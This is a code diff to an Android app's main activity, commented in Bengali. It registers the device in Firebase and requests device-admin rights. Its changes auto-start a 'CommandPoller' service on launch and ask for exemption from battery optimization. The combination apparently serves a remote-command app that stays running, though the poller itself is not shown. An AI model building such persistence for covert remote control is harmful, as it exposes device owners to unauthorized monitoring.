@@ -6,7 +6,10 @@ import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
+import android.net.Uri;
+import android.os.Build;
 import android.os.Bundle;
+import android.os.PowerManager;
 import android.provider.Settings;
 import android.view.View;
 import android.widget.Button;
@@ -48,10 +51,9 @@ public class MainActivity extends Activity {
 
         statusText.setText("Device ID: " + deviceId);
 
-        // Firebase Database reference
         dbRef = FirebaseDatabase.getInstance().getReference();
 
-        // অ্যাডমিন পারমিশন বাটন
+        // Admin পারমিশন বাটন
         adminBtn.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
@@ -67,7 +69,7 @@ public class MainActivity extends Activity {
             }
         });
 
-        // সার্ভিস চালু বাটন
+        // Start Service বাটন (ম্যানুয়াল, তবু রাখলাম)
         startBtn.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
@@ -76,8 +78,14 @@ public class MainActivity extends Activity {
             }
         });
 
-        // Firebase-এ ডিভাইস রেজিস্টার করুন
+        // Firebase-এ ডিভাইস রেজিস্টার
         registerDeviceInFirebase();
+
+        // ✅ অটো-স্টার্ট: অ্যাপ খুললেই সার্ভিস চালু
+        startService(new Intent(MainActivity.this, CommandPoller.class));
+
+        // ✅ ব্যাটারি অপটিমাইজেশন ignore চাওয়া
+        requestIgnoreBatteryOptimization();
     }
 
     private void registerDeviceInFirebase() {
@@ -90,11 +98,26 @@ public class MainActivity extends Activity {
 
         dbRef.child("devices").child(deviceId).setValue(deviceData)
                 .addOnSuccessListener(aVoid -> {
-                    Toast.makeText(MainActivity.this, "Registered in Firebase", Toast.LENGTH_SHORT).show();
+                    Toast.makeText(MainActivity.this, "Registered", Toast.LENGTH_SHORT).show();
                 })
                 .addOnFailureListener(e -> {
                     Toast.makeText(MainActivity.this, "Firebase error: " + e.getMessage(), Toast.LENGTH_LONG).show();
                 });
+    }
+
+    private void requestIgnoreBatteryOptimization() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
+            if (!pm.isIgnoringBatteryOptimizations(getPackageName())) {
+                try {
+                    Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
+                    intent.setData(Uri.parse("package:" + getPackageName()));
+                    startActivity(intent);
+                } catch (Exception e) {
+                    // কিছু ফোনে এই intent কাজ করে না — সমস্যা নেই
+                }
+            }
+        }
     }
 
     @Override
